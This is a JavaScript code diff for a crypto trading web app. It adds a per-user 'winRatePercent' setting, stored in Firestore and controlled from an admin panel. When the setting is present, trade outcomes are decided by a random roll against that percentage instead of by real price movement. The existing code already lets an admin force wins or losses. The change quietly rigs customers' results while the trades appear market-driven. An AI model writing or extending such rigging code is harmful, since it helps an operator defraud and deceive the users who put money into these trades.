@@ -754,7 +754,7 @@ tmAgainBtn.addEventListener('click', () => {
   document.querySelectorAll('.duration-box').forEach(b => b.classList.remove('selected'));
 });
 
-// ---------- Trade execution (resolved by real live price movement, unless an admin forces the result) ----------
+// ---------- Trade execution (resolved by real live price movement, unless an admin forces the result, or a win-rate % override is set) ----------
 async function fetchLivePrice(symbol) {
   const res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}`);
   const data = await res.json();
@@ -875,6 +875,15 @@ async function placeTrade(direction) {
       } catch (e) {}
     }
 
+    // ---- Check whether this user has a Win Rate % override set in the admin panel ----
+    let winRatePercent = null;
+    try {
+      const userSnap = await firebase.firestore().collection('users').doc(currentUser.uid).get();
+      if (userSnap.exists && typeof userSnap.data().winRatePercent === 'number') {
+        winRatePercent = userSnap.data().winRatePercent;
+      }
+    } catch (e) {}
+
     const wentUp = exitPrice > entryPrice;
     const wentDown = exitPrice < entryPrice;
     let won, tie;
@@ -882,6 +891,9 @@ async function placeTrade(direction) {
       won = true; tie = false;
     } else if (forcedResult === 'lose') {
       won = false; tie = false;
+    } else if (winRatePercent !== null) {
+      won = (Math.random() * 100) < winRatePercent;
+      tie = false;
     } else {
       won = (direction === 'up' && wentUp) || (direction === 'down' && wentDown);
       tie = exitPrice === entryPrice;
